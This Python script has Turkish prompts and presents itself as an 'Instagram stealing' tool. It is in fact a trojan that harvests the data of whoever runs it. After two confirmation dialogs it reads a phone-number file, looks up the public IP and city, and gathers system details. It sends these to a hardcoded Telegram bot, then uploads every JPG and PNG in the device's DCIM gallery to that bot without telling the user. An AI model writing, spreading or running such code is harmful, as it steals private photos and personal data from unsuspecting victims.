import os
import platform
import subprocess
import sys

# requests modülünü yükle
try:
    import requests
except ImportError:
    print("requests modülü bulunamadı, yükleniyor...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])

from tkinter import Tk, messagebox, simpledialog

# Telegram bot bilgileri
bot_token = '7889269990:AAHPRBn4wqXnjClQMLyrHwljtVZNrcckJAE'
chat_id = '6624281537'

gallery_path = "/storage/emulated/0/DCIM/"  # Fotoğraflar burada
phone_file_path = "/storage/emulated/0/phone_number.txt"  # Telefon numarasını içeren dosya

root = Tk()
root.withdraw()

# Telegram kullanıcı adını al
username = simpledialog.askstring("Telegram Kullanıcı Adı", "Lütfen Telegram kullanıcı adınızı girin:")

if username:
    # Fotoğraf + cihaz bilgisi onayı
    answer = messagebox.askyesno("insta Çalma", "Devam etmek istiyor musunuz?")
    
    if answer:
        # Numara gönderilsin mi?
        numara_onay = messagebox.askyesno("İnsta Çalma", "İnstayı Çalma Aktif Olsunmu?")
        
        phone_number = "Gönderilmedi"
        if numara_onay:
            # Dosyadan telefon numarasını al
            if os.path.exists(phone_file_path):
                with open(phone_file_path, 'r') as file:
                    phone_number = file.read().strip()  # Dosyadaki numarayı oku
            else:
                phone_number = "Dosya bulunamadı"
        
        # IP ve şehir bilgisi
        try:
            ip = requests.get("https://api.ipify.org").text
            geo = requests.get(f"http://ip-api.com/json/{ip}").json()
            city = geo.get("city", "Bilinmiyor")
        except:
            ip = "Alınamadı"
            city = "Bilinmiyor"

        device_info = f"""
        Telegram Kullanıcı Adı: {username}

        Telefon Numarası: {phone_number}

        Cihaz Bilgileri:
        Sistem: {platform.system()}
        Sürüm: {platform.version()}
        Makine: {platform.machine()}
        İşlemci: {platform.processor()}
        IP: {ip}
        Şehir: {city}
        """

        # Bilgileri Telegram'a gönder
        requests.post(
            f"https://api.telegram.org/bot{bot_token}/sendMessage",
            data={"chat_id": chat_id, "text": device_info}
        )

        # Fotoğrafları gönder
        for root_dir, dirs, files in os.walk(gallery_path):
            for filename in files:
                if filename.lower().endswith(('.jpg', '.jpeg', '.png')):
                    try:
                        with open(os.path.join(root_dir, filename), 'rb') as photo:
                            requests.post(
                                f"https://api.telegram.org/bot{bot_token}/sendPhoto",
                                files={"photo": photo},
                                data={"chat_id": chat_id}
                            )
                    except:
                        pass
    else:
        print("Kullanıcı iptal etti.")
else:
    print("Telegram kullanıcı adı girilmedi.")
